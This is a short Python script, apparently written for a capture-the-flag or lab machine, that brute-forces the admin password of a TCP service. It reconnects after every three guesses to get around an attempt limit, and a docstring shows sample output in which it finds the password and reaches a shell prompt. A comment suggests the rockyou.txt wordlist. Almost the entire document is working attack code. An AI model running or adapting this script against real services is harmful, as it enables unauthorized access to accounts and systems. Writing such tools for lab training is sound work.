"""
Output after use of script:
Authentication response: Password:

[...]

Authentication failed.
Password not found in given list
Authentication response: Password:

Authentication failed.
Authentication response: Welcome Admin!!! Type "shell" to begin

Password is:  abc123
Password found

"""


import socket

def connect_and_authenticate(ip, port, passwordlist):
    # Number of attempts
    max_attempts = 3
    attempt = 0

    while attempt < max_attempts:
        try:
            # Establish a socket connection
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((ip, port))
                
                # Send 'admin' command to trigger password prompt - we know that admin trigger proper shell from enumeration
                s.sendall(b'admin\n')
                
                # Receive response from server
                response = s.recv(1024).decode()
                # print("Server response:", response)

                # Check if the server is asking for a password
                if "Password:" in response:
                    # Prompt for password input from user
                    password = passwordlist[attempt]
                    s.sendall(password.encode() + b'\n')
                    
                    # Receive authentication result
                    auth_response = s.recv(1024).decode()
                    print("Authentication response:", auth_response)
                    
                    if not "Password:" in auth_response:
                        print("Password is: ", password)
                        return 1
                    else:
                        print("Authentication failed.")
                    
                attempt += 1          
        except Exception as e:
            print(f"Error during connection or authentication: {e}")
            break

    return 0

# Replace with actual IP
ip = "10.10.237.171"
port = 8000

def divide_into_sublists(lst, n=3):
    return [lst[i:i + n] for i in range(0, len(lst), n)]

# List of passwords to try - the best option is to use rockyou.txt
paswd_list = ["admin", "abc", "abcd", 'xd', 'xdd', 'abc1', 'abrakadabra']
sublists = divide_into_sublists(paswd_list)

for sublist in sublists:
    if connect_and_authenticate(ip, port, sublist) == 1:
        print("Password found")
        break
    else:
        print("Password not found in given list")
